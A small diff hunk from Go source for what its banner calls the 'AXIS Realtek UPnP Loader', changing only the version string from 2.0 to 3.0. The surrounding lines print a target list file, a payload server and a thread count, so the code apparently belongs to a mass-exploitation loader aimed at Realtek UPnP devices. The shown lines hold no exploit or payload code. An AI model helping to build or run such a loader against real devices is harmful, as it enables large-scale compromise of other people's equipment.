@@ -249,7 +249,7 @@ func main() {
 		threads, _ = strconv.Atoi(os.Args[3])
 	}
 
-	fmt.Printf("[*] AXIS 2.0 Realtek UPnP Loader\n")
+	fmt.Printf("[*] AXIS 3.0 Realtek UPnP Loader\n")
 	fmt.Printf("[*] Loading targets from: %s\n", ipFile)
 	fmt.Printf("[*] Payload server: %s\n", serverIP)
 	fmt.Printf("[*] Using %d concurrent threads\n", threads)
